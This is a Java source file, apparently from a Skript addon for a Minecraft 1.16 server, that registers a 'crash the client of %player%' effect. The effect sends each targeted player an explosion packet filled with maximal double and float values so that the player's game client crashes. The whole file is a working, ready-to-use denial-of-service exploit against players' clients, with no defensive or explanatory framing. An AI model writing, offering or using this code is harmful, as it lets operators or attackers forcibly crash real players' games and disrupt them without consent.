package me._30p87.addon.elements.effects;

import java.util.Collections;

import javax.annotation.Nullable;

import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;

import net.minecraft.server.v1_16_R3.PacketPlayOutExplosion;
import net.minecraft.server.v1_16_R3.Vec3D;

import ch.njol.skript.Skript;
import ch.njol.skript.lang.Effect;
import ch.njol.skript.lang.Expression;
import ch.njol.skript.lang.SkriptParser.ParseResult;
import ch.njol.util.Kleenean;


public class EffCrashPlayer extends Effect {
 
   static {
	   Skript.registerEffect(EffCrashPlayer.class, "crash [the] [client of] %player%");
	}
	
   private Expression<Player> player;

   @SuppressWarnings("unchecked")
   @Override
   public boolean init(Expression<?>[] expressions, int matchedPattern, Kleenean isDelayed, ParseResult parser) {
	   this.player = (Expression<Player>) expressions[0];
	   return true;
   }
 
   @Override
   public String toString(@Nullable Event event, boolean debug) {
	   return "Crash player effect with expression player: " + player.toString(event, debug);
   }

   @Override
   protected void execute(Event event) {
       if (player == null)  return;
       for (Player user : player.getAll(event)) {
    	   ((CraftPlayer)user).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
       }
   }
}
